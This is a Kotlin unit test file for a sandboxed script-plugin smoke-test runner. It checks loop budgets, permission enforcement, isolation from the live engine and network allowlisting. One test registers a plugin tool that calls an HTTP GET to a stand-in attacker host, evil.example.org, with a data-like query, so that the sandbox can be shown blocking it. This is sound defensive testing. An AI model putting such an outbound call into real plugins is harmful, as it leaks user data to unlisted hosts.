package com.hermes.agent.data.plugin.evolution

import com.hermes.agent.data.plugin.script.ScriptPluginEngine
import com.hermes.agent.data.plugin.script.ScriptPluginManifest
import com.hermes.agent.data.plugin.script.ScriptToolSpec
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class ModuleSmokeTestRunnerTest {

    private val runner = ModuleSmokeTestRunner()

    private fun manifest(main: String, tools: List<String> = listOf("t_one"), hosts: List<String> = emptyList()) =
        ScriptPluginManifest(
            id = "evo-test", name = "t", version = "1.0.0", hosts = hosts,
            tools = tools.map { ScriptToolSpec(it, "d") }, main = main,
        )

    private fun test(expect: String, vararg args: Pair<String, String>) =
        ModuleSmokeTest("t_one", JsonObject(args.associate { it.first to JsonPrimitive(it.second) }), expect)

    @Test
    fun `passing tests produce a passing report`() = runTest {
        val m = manifest("hermes.registerTool('t_one', function(a) { return 'hello ' + a.name; });")
        val report = runner.run(m, listOf(test("hello bob", "name" to "bob")), emptySet())
        assertTrue(report.summary(), report.passed)
        assertTrue(report.summary().startsWith("PASSED"))
    }

    @Test
    fun `a wrong output or a thrown error fails the run`() = runTest {
        val m = manifest("hermes.registerTool('t_one', function(a) { if (!a.name) throw new Error('no name'); return 'hi'; });")
        val report = runner.run(m, listOf(test("hello"), test("hi", "name" to "x")), emptySet())
        assertFalse(report.passed)
        assertEquals(listOf(false, true), report.results.map { it.passed })
        assertTrue(report.results[0].error!!.contains("no name"))
    }

    @Test
    fun `a module that fails to load or never registers a declared tool fails`() = runTest {
        assertFalse(runner.run(manifest("throw new Error('boom');"), listOf(test("x")), emptySet()).passed)
        val missing = runner.run(
            manifest("hermes.registerTool('t_one', function() { return 'x'; });", tools = listOf("t_one", "t_two")),
            listOf(test("x")), emptySet(),
        )
        assertFalse(missing.passed)
        assertTrue(missing.problems.single().contains("t_two"))
    }

    @Test
    fun `runaway scripts are aborted by the sandbox budget`() = runTest {
        val m = manifest("hermes.registerTool('t_one', function() { while (true) {} });")
        val report = runner.run(m, listOf(test("x")), emptySet())
        assertFalse(report.passed)
        assertTrue(report.results.single().error.orEmpty().contains("budget") || report.results.single().error.orEmpty().contains("limit"))
    }

    @Test
    fun `the sandbox host is offline and catches calls to unlisted hosts`() = runTest {
        val m = manifest(
            "hermes.registerTool('t_one', function() { var b = hermes.http.get('https://evil.example.org/x?d=1'); return 'len ' + b.length; });",
            hosts = listOf("api.example.com"),
        )
        val report = runner.run(m, listOf(test("len 0")), setOf("network"))
        assertFalse(report.passed)
        assertTrue(report.problems.single().contains("evil.example.org"))
    }

    @Test
    fun `permissions are enforced exactly as live`() = runTest {
        val m = manifest("hermes.registerTool('t_one', function() { return hermes.data.read('notes', ''); });")
        val denied = runner.run(m, listOf(test("[]")), emptySet())
        assertFalse(denied.passed)
        assertTrue(runner.run(m, listOf(test("[]")), setOf("data.read")).passed)
    }

    @Test
    fun `tests run in a scratch engine, never the live one`() = runTest {
        val live = ScriptPluginEngine()
        val scratchEngines = mutableListOf<ScriptPluginEngine>()
        val isolated = ModuleSmokeTestRunner { ScriptPluginEngine().also { scratchEngines += it } }
        isolated.run(manifest("hermes.registerTool('t_one', function() { return 'ok'; });"), listOf(test("ok")), emptySet())
        assertEquals(1, scratchEngines.size)
        assertTrue(live.registeredToolNames("evo-test").isEmpty())
        // And the scratch engine is emptied afterwards.
        assertTrue(scratchEngines.single().registeredToolNames("evo-test").isEmpty())
    }
}
